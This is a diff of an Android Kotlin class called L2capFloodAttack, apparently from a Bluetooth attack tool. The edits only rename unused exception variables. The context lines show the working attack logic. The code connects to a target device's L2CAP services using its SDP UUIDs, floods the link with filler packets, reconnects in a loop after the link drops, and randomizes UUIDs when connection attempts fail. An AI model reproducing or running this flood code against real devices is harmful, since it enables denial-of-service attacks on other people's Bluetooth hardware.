@@ -56,7 +56,7 @@ class L2capFloodAttack(private val targetAddress: String) {
         val sdpUuids: List<UUID> = try {
             device.fetchUuidsWithSdp()
             device.uuids?.map { it.uuid }?.take(8) ?: emptyList()
-        } catch (_: Exception) { emptyList() }
+        } catch (ignored: Exception) { emptyList() }
 
         var uuidIndex = 0
         var uuid: UUID = sdpUuids.getOrNull(0) ?: BASE_UUID
@@ -73,16 +73,16 @@ class L2capFloodAttack(private val targetAddress: String) {
                     onLog("Sending payload..")
                     flood(socket, onLog, isRunning)
                     // Flood returned = link died or stop pressed; close and re-connect.
-                    try { socket.close() } catch (_: IOException) {}
+                    try { socket.close() } catch (ignored: IOException) {}
                     if (!isRunning()) break
                     // Brief pause before reconnect so we don't hot-spin.
                     delay(300)
                     continue
                 } else {
-                    try { socket.close() } catch (_: IOException) {}
+                    try { socket.close() } catch (ignored: IOException) {}
                 }
             } catch (err: IOException) {
-                try { socket?.close() } catch (_: IOException) {}
+                try { socket?.close() } catch (ignored: IOException) {}
                 if (!isRunning() || !currentCoroutineContext().isActive) break
                 // Next UUID: walk SDP list first, then randomize like the original.
                 uuidIndex++
@@ -92,7 +92,7 @@ class L2capFloodAttack(private val targetAddress: String) {
                     else -> regenUuid()
                 }
                 onLog("Failed to connect. Generated new UUID: $uuid")
-                try { delay(150) } catch (_: Exception) { break }
+                try { delay(150) } catch (ignored: Exception) { break }
             } catch (e: SecurityException) {
                 onLog("Missing BLUETOOTH_CONNECT permission.")
                 Log.e(TAG, "perm", e)
@@ -107,7 +107,7 @@ class L2capFloodAttack(private val targetAddress: String) {
         onLog: (String) -> Unit,
         isRunning: () -> Boolean
     ) {
-        val dataSize = try { socket.maxTransmitPacketSize.takeIf { it > 0 } ?: 600 } catch (_: Exception) { 600 }
+        val dataSize = try { socket.maxTransmitPacketSize.takeIf { it > 0 } ?: 600 } catch (ignored: Exception) { 600 }
         val sendBuffer = ByteArray(dataSize) { ((it % 40) + 'A'.code.toByte()).toByte() }
         try {
             var writes = 0
